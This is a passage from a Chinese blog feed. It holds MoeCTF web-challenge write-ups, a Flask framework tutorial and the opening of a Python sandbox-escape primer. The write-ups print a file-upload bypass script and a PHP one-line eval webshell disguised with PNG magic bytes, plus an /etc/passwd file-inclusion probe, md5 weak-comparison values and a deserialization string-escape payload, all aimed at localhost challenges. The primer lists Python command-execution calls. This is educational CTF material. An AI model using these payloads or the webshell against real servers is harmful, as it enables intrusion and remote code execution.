punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'向右'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'steering_control'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'-1'</span>    <span class="token keyword">elif</span> <span class="token string">'向左'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'steering_control'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'其他'</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">'steering_control'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span>    <span class="token keyword">if</span> <span class="token string">'太小'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'throttle'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'0'</span>    <span class="token keyword">elif</span> <span class="token string">'太大'</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">'throttle'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'2'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'其他'</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">'throttle'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span>    <span class="token keyword">return</span> data<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'第'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'次'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请求数据：'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>    fl<span class="token operator">=</span>result<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">:</span>        cookies<span class="token operator">=</span>requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>dict_from_cookiejar<span class="token punctuation">(</span>res<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>    data<span class="token operator">=</span>setdata<span class="token punctuation">(</span>fl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑一下就可以出flag</p><img src="/img/9-12/12.png"><h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>经典文件上传处理</p><p>首页查看js源码，查看ajex，发现upload.php</p><img src="/img/9-12/15.png"><p>进行访问，得到源码</p><img src="/img/9-12/16.png"><p>对上传文件检查了文件类型，和文件名，关键$fileNameParts&nbsp;=&nbsp;explode(‘.’,&nbsp;$fileName); 将文件名变为数组后，$secondSegment&nbsp;=&nbsp;$fileNameParts[1]; </p><p>固定取下标为1</p><p>绕过：抓包，修改文件类型为image/png,修改文件名为test.png.php</p><p>这里我没抓包，我用的python脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span><span class="token string">'http://localhost:55163/upload.php'</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'test.png.php'</span> <span class="token comment">#文件名</span>            <span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"D:/phpstudy_pro/WWW/upload- picture/link.php"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>            <span class="token punctuation">,</span><span class="token string">'image/png'</span> <span class="token comment">#文件类型</span>            <span class="token punctuation">)</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>上传一句话木马成功！</p><img src="/img/9-12/17.png"><p>这里附上一句话木马（不看就好-*-*）</p><pre class="language-php" data-language="php"><code class="language-php">89504E47<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span></code></pre><p>访问验证一下</p><img src="/img/9-12/18.png"><p>用蚁剑一连，flag就在根目录</p><img src="/img/9-12/19.png"><h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>文件上传先试下水，上传成功</p><img src="\img\9-12\1.png"><p>查看一下图片</p><img src="\img\9-12\2.png"><p>看这url,应该是用着文件包含，再试试，尝试包含/etc/passwd</p><img src="\img\9-12\3.png"><p>这里只能显示图片，burp抓下包，这里我改成用python脚本(也一样)</p><img src="\img\9-12\4.png"><p>ok,成功包含,试下flag</p><img src="\img\9-12\5.png"><p>居然是个提示(…….),访问一下Fl3g_n0t_Here_dont_peek!!!!!.php</p><p>这里发现是PHP的md5弱比较,不多说了</p><p>最终payload</p><pre class="language-text" data-language="text"><code class="language-text">http://localhost:55371/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=s878926199a&amp;param2=s214587387a</code></pre><img src="\img\9-12\6.png"><h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>典型的PHP反序列化中的字符串逃逸题目</p><p>访问它包含的文件Hanxin.exe.php ，得到源码，</p><p>对两个页面进行代码审计，发现，关键是反序列化后Spear_Owner 属性为MaoLei 就可获得flag</p><p>而我们可以通过get传参给Chant 属性赋值，恰巧他对序列化的字符串进行了如下的字符串替换</p><img src="/img/9-12/13.png"><p>所以先写出要逃逸的字符串：</p><pre class="language-text" data-language="text"><code class="language-text">";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre><p>然后要逃逸的字符总数为35个，</p><p>发现：di_qi_qiang 替换后增加5个字符，di_jiu_qiang 替换后增加20个字符</p><p>因此加入di_qi_qiang 3个，di_jiu_qiang个；序列化后替换后会恰好增加35个字符，然后后面的字符就能逃逸出去，进行反序列化到}结束，就此覆盖了他构造函数对Spear_Owner 赋值，拿到flag</p><p>最终payload</p><pre class="language-text" data-language="text"><code class="language-text">http://localhost:53192/?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_jiu_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre><img src="/img/9-12/14.png">]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入门flask框架</title>
      <link href="/2023/08/28/%E5%85%A5%E9%97%A8flask%E6%A1%86%E6%9E%B6/"/>
      <url>/2023/08/28/%E5%85%A5%E9%97%A8flask%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="入门Flask框架"><a href="#入门Flask框架" class="headerlink" title="入门Flask框架"></a>入门Flask框架</h1><p>Flask是一个用Python语言编写的轻量级Web应用框架，它采用WSGI工具箱和Jinja2模板引擎，该框架使用简单的核心和扩展，没有默认的数据库和窗体验证工具，被称为“微框架”。</p><p><strong>核心</strong></p><p>WSGI工具箱采用Werkzeug(路由模块)，模板引擎采用jinja2</p><p><strong>特点</strong></p><p>轻量级，只提供一些核心操作 </p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a><strong>相关知识</strong></h2><p><strong>框架</strong>：Web框架是一种用于开发Web应用的软件架构，它提供了一些通用的功能和组件，使得开发者可以更方便、高效、安全地构建Web应用。</p><p><strong>模板引擎</strong>（Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p><p>模板引擎的核心原理就是两个字：<strong>替换</strong>。将预先定义的标签字符替换为指定的业务数据，或者根据某种定义好的流程进行输出</p><p>模板：模板是一种文件，它可以包含固定的和动态的内容。动态的内容通常是用一种特定的语法来表示的，</p><p>**路由(route)**：简单来说，路由就是URL到视图函数的映射。当访问某个URL时，就会执行对应的函数</p><p>如：/usersu        -&gt;  getAllUsers()</p><p> router 可以理解为一个容器，或者说一种机制，它管理了一组 route。简单来说，route 只是进行了URL和函数的映射，而在当接收到一个URL之后，去路由映射表中查找相应的函数，这个过程是由 router 来处理的。</p><h2 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask        <span class="token comment">#1.导入</span>app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>            <span class="token comment">#2.创建Flask对象，管理全局路由，配置信息</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>            <span class="token comment">#3.设置装饰器，将路由映射到视图函数</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#4.定义触发函数</span>    <span class="token keyword">return</span> <span class="token string">'Hello world'</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment">#5.Flask对象调用run方法,启动服务器</span></code></pre><p>目录结构：app.py主程序,templates存放模板文件，static存放静态文件</p><p><strong>装饰器</strong></p><p>装饰器的一般语法结构如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义装饰器函数，接收一个函数作为参数</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment"># 定义包装函数，接收任意数量的参数</span>         <span class="token comment"># 在这里可以添加一些代码，在原函数执行前后执行</span>         <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> kwargs<span class="token punctuation">)</span>      <span class="token comment"># 调用原函数，并返回结果</span>    <span class="token keyword">return</span> wrapper <span class="token comment"># 返回包装函数</span></code></pre><p>要使用装饰器，可以在要被装饰的函数上方使用@符号，后面跟着装饰器的名称。</p><pre class="language-none"><code class="language-none">@decorator # 使用@符号应用装饰器def my_func(): # 定义要被装饰的函数pass # 函数体</code></pre><p>这相当于执行了以下代码：</p><pre class="language-none"><code class="language-none">def my_func():    passmy_func = decorator(my_func) # 将my_func作为参数传给decorator，并将返回值赋给my_func</code></pre><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h4 id="flask对象初始化参数"><a href="#flask对象初始化参数" class="headerlink" title="flask对象初始化参数"></a>flask对象初始化参数</h4><p>Flask(import_name,static_url_path,static_floder,template_folder)</p><p>import_name(必要):</p><p>工程(主模块)目录名称，__name__当前模块(目录)名称，可决定访问静态文件的路径</p><p>static_url_path</p><p>静态文件访问路径，默认为/+static_floder</p><p>static_floder</p><p>静态文件存储的文件夹名称，默认为’stastic’</p><p>template_folder</p><p>模板文件存储的文件夹名称，默认为’templates’</p><h4 id="web应用程序配置参数"><a href="#web应用程序配置参数" class="headerlink" title="web应用程序配置参数"></a>web应用程序配置参数</h4><p>作用：集中管理项目中所有的配置</p><p>flask将配置信息放入了app.config属性之中，该属性可以按照字典类型进行操作</p><h5 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h5><p>1.从配置对象中加载</p><p>app.config.from_object(配置对象)，如</p><pre class="language-none"><code class="language-none">class DefaultConfig(object)：          #设置配置类    SECRET_KEY='acdvdasd'    app.config.from_object(DefaultConfig)</code></pre><p>2.从配置文件中加载</p><p>app.config.from_pyfile(‘文件名’)</p><p>3.从环境变量中加载</p><p>app.config.from_envvar(‘环境变量名’)</p><p>app.run(host=”0.0.0.0”,port=5000,debug=True,threaded=True)</p><p>debug调试模式</p><p>1.程序修改后可以自动重启</p><p>2.服务器出现错误能够返回给前端</p><p>threaded–是否开启多线程</p><p>终端启动–flask run -h 0.0.0.0 -p 5000</p><p>读取环境变量FLASK_APP的值作为启动文件</p><p>export FLASK_APP=app </p><h2 id="路由与蓝图"><a href="#路由与蓝图" class="headerlink" title="路由与蓝图"></a>路由与蓝图</h2><h5 id="查看全部路由"><a href="#查看全部路由" class="headerlink" title="查看全部路由"></a>查看全部路由</h5><p>1.命令行</p><p>flask routes</p><p>2.程序中查看</p><p>app.url_map</p><p>app.url_map.iter_rules()–返回列表</p><h5 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h5><p>默认支持的请求方式：GET、OPTION、HEAD</p><p>app.route(‘url’,methods=list)</p><h3 id="蓝图"><a href="#蓝图" class="headerlink" title="蓝图"></a>蓝图</h3><p>一个存储一组视图方法的容器对象，具有以下特d</p><ul><li>一个应用可以具有多个Blueprint</li><li>可以将一个Blueprint注册到任何一个未使用的URL下</li><li>蓝图可以单独具有自己的模板、静态文件、或其他通用操作方法，并不是必须实现应用视图和函数</li><li>一个应用初始化时，就应该注册需要使用Blueprint，蓝图并不是一个完整应用，必须要注册到某一应用中</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>1.创建蓝图对象</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Blueprintuser_bp<span class="token operator">=</span>Blueprint<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span>__name__<span class="token punctuation">)</span></code></pre><p>2.在这个蓝图对象上进行操作，注册路由，指定静态文件，注册模板过滤器</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@user_bp<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">user_profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'usee_profile'</span></code></pre><p>3.在应用对象上注册蓝图对象</p><pre class="language-none"><code class="language-none">app.register_blueprint(user_bp)</code></pre><h2 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h2><p>转化器，获取动态url参数</p><p><strong>获取路径参数</strong></p><p>route(‘/user/<a href="converter:id">converter:id</a>‘)</p><p>converter–数据类型：string（默认）、int、flaot、path、uuid、any</p><p>url_for()–根据函数获取url</p><h5 id="获取请求数据"><a href="#获取请求数据" class="headerlink" title="获取请求数据"></a>获取请求数据</h5><p>通过request对象获取</p><table><thead><tr><th>属性</th><th>说明</th><th>类型</th></tr></thead><tbody><tr><td>data</td><td>记录请求数据，并转化为字符串</td><td>*</td></tr><tr><td>form</td><td>记录请求中的表单数据</td><td>MultiDict</td></tr><tr><td>args</td><td>记录查询参数</td><td>MultiDict</td></tr><tr><td>cookies</td><td>记录请求中cookie信息</td><td>Dict</td></tr><tr><td>headers</td><td>记录请求头信息</td><td>EnvironHeaders</td></tr><tr><td>method</td><td>记录请求的HTTP方法</td><td>GET/POST</td></tr><tr><td>url</td><td>记录URL地址</td><td>string</td></tr><tr><td>files</td><td>记录请求上传的文件</td><td>*</td></tr></tbody></table><p>示例</p><pre class="language-none"><code class="language-none">id=request.args.get('id')</code></pre><h3 id="处理响应"><a href="#处理响应" class="headerlink" title="处理响应"></a>处理响应</h3><h5 id="1-模板渲染"><a href="#1-模板渲染" class="headerlink" title="1.模板渲染"></a>1.模板渲染</h5><p>使用render_template方法渲染模板并返回</p><p><strong>导入</strong></p><pre class="language-none"><code class="language-none">from flask import render_template</code></pre><p><strong>使用</strong></p><pre class="language-none"><code class="language-none">return render_template('index.html',mystr(模板内变量名)=strval(程序中的变量),...)</code></pre><p>参数已经封装成字典，在字典前添加**,如**data</p><p>render_template_string()将字符串当作模板文件内容进行渲染</p><h5 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2.重定向"></a>2.重定向</h5><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><h5 id="3-返回JSON"><a href="#3-返回JSON" class="headerlink" title="3.返回JSON"></a>3.返回JSON</h5><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>json_dict<span class="token punctuation">)</span></code></pre><p><strong>自定义状态码和响应头</strong></p><p>make_respone(其中一种方式)</p><pre class="language-python" data-language="python"><code class="language-python">resp<span class="token operator">=</span>make_respone<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Itcast'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'Test'</span>resp<span class="token punctuation">.</span>status<span class="token operator">=</span><span class="token string">"404  not found"</span><span class="token keyword">return</span> resp</code></pre><h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><p>response.setcookie( )</p><p>response.delete_cookie()–删除cookie</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> sessionsession<span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'test'</span></code></pre><h2 id="请求钩子与上下文"><a href="#请求钩子与上下文" class="headerlink" title="请求钩子与上下文"></a>请求钩子与上下文</h2><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>abort(code)</p><p>http异常主动抛出，抛出一个状态码code</p><h5 id="捕获错误"><a href="#捕获错误" class="headerlink" title="捕获错误"></a>捕获错误</h5><p>errorhandler装饰器</p><p>注册一个错误处理程序，当程序抛出异常时，就会执行装饰器的方法</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">(</span>状态码或异常的类型<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">server_error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h3 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h3><p>请求钩子是一种在Flask框架中实现请求前后执行一些操作的方法，比如打印日志、验证身份、处理异常等。请求钩子是通过<strong>装饰器</strong>的形式实现，Flask支持如下四种请求钩子：</p><ul><li><code>before_first_request</code>：在处理第一个请求之前执行，可以用于初始化项目的一些配置或资源。</li><li><code>before_request</code>：在每次请求之前执行，可以用于判断权限、转换路由参数或预处理客户端请求的数据。</li><li><code>after_request</code>：在每次请求（视图函数处理）之后执行，前提是视图函数没有出现异常，可以用于修改响应数据、记录操作历史、清理收尾工作等。</li><li><code>teardown_request</code>：在每次请求之后执行，无论视图函数是否出现异常，可以用于记录异常信息、释放资源等。</li></ul><p>示例</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"初始化数据库连接"</span><span class="token punctuation">)</span></code></pre><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><p>Flask中的上下文是指在处理请求时，Flask会创建一些对象，如request, session, current_app, g等，这些对象保存了请求相关的信息或程序的状态。上下文可以让视图函数直接访问这些对象，而不需要通过参数传递。</p><p>Flask中有两种上下文：请求上下文和程序上下文。</p><ul><li>请求上下文包括request和session，它们是从_request_ctx_stack这个LocalStack对象中获取的。</li><li>程序上下文包括current_app和g，它们是从_app_ctx_stack这个LocalStack对象中获取的。</li></ul><h5 id="请求上下文"><a href="#请求上下文" class="headerlink" title="请求上下文"></a>请求上下文</h5><p>–解决多线程问题</p><p>request、session</p><h5 id="程序上下文"><a href="#程序上下文" class="headerlink" title="程序上下文"></a>程序上下文</h5><p>不同文件下调用对象</p><p><strong>current_app</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> current_app引用current_app相当于主程序中的app对象current_app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Itcast'</span><span class="token punctuation">)</span></code></pre><p><strong>g对象</strong></p><p>g作为flask程序全局的一个临时变量，便于函数之间的参数传递</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>模板中的变量</p><p><code>{{ var }}</code>,视图传递模板的数据，变量不存在，默认忽略</p><p>模板中的标签</p><p><code>{% tag %}</code></p><h3 id="主要语法标签："><a href="#主要语法标签：" class="headerlink" title="主要语法标签："></a>主要语法标签：</h3><p>变量标记 - <code>{{ }}</code></p><p>语句执行 - <code>{% %}</code></p><p>注释语句 - ````</p><p>变量输出：</p><p>变量输出以<code>{{ }}</code>包裹</p><p>变量 - <code>{{变量名}}</code>，比如<code>{{myname}}</code></p><p>对象 - <code>{{obj.属性}}</code>、字典 - <code>{{dict['key']}}</code>、列表 - <code>{{lists[i]}}</code>、函数 - <code>{{func()}}</code></p><p><strong>条件语句</strong>：</p><p>根据条件选择显示不同的html部分</p><pre class="language-none"><code class="language-none">{% if condition %}     html{% elif condition %}    html{% else %}    html{% endif %}</code></pre><p>for <strong>循环语句</strong>：</p><pre class="language-none"><code class="language-none">{% for item in items %}   html{{item}} html{% endfor %}</code></pre><p>设置变量</p><pre class="language-none"><code class="language-none">{% set a='666' %}{{ a }}</code></pre><h5 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h5><p>将网页结构提取出来，新建一个base.html</p><p>继承语法：</p><p><code>{% extend "base.html" %}</code></p><p>其中base.html为父模板，所有的字模板脑结构都继承自base</p><p>模板全局变量</p><p>上下文处理函数：</p><pre class="language-none"><code class="language-none">@app.context_processordef account():username = "luxp"return {'username':'luxp'}</code></pre><p>每个视图函数执行的时候，会自动执行该函数，接受该变量传给模板渲染函数</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web框架 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探python沙箱逃逸</title>
      <link href="/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="初探python沙箱逃逸"><a href="#初探python沙箱逃逸" class="headerlink" title="初探python沙箱逃逸"></a>初探python沙箱逃逸</h1><p>为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os</p><p>沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h1><h3 id="命令执行函数与模块"><a href="#命令执行函数与模块" class="headerlink" title="命令执行函数与模块"></a>命令执行函数与模块</h3><p>在 Python 中执行系统命令的方式有：</p><ul><li>os：<code>system</code>,<code>popen</code></li><li>commands：(仅限<code>2.x</code>)<code>getstatusoutput</code>,<code>getoutput</code></li><li>subprocess: <code>getstatusoutput</code>,<code>getoutput</code></li><li>timeit：<code>timeit.sys</code>、<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li><li>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li><li>pty：<code>pty.spawn('ls')</code>、<code>pty.os</code></li><li>bdb：<code>bdb.os</code>、<code>cgi.sys</code></li><li>cgi：<code>cgi.os</code>、<code>cgi.sys</code></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen2<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen3<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x</span><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen4<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h3 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h3><p>命名空间定义了在某个作用域内变量名和绑定值之间的对应关系，命名空间是键值对的集合，变量名与值是一一对应关系。作用域定义了命名空间中的变量能够在多大范围内起作用。命名空间在python解释器中是以字典的形式存在的，是以一种可以看得见摸得着的实体存在的。作用域是python解释器定义的一种规则，该规则确定了运行时变量查找的顺序，是一种形而上的虚的规定。</p><p><strong>命令空间</strong></p><ul><li>命名空间提供了一个在大型项目下避免名字冲突的方法</li><li>Python 中各个命名空间都是独立的，他们之间无任何关系</li><li>一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</li></ul><p>命名空间的种类分为 3 类，命名空间的种类也体现了命名空间的生命周期。三个种类及生命周期描述如下：</p><p>1）内置名称（built-in names）</p><p>Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。</p><p>生命周期：</p><p>对于Python built-in names组成的命名空间，它在Python解释器启动的时候被创建，在解释器退出的时候才被删除；</p><p>2）全局名称（global names）</p><p>模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。</p><p>生命周期：</p><p>对于一个Python模块的global namespace，它在这个module被import的时候创建，在解释器退出的时候退出；</p><p>3）局部名称（local names）</p><p>函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p><p>生命周期：</p><p>对于一个函数的local namespace，它在函数每次被调用的时候创建，函数返回的时候被删除。</p><p>注意： 命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束。 因此，我们无法从外部命名空间访问内部命名空间的对象。例如：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># var1 是全局名称</span>var1 <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">some_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment"># var2 是局部名称</span>    var2 <span class="token operator">=</span> <span class="token number">6</span>    <span class="token keyword">def</span> <span class="token function">some_inner_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment"># var3 是内嵌的局部名称</span>        var3 <span class="token operator">=</span> <span class="token number">7</span></code></pre><p>局部的命名空间 -&gt; 全局命名空间 -&gt; 内置命名空间</p><p><strong>作用域</strong></p><p>作用域就是一个 Python 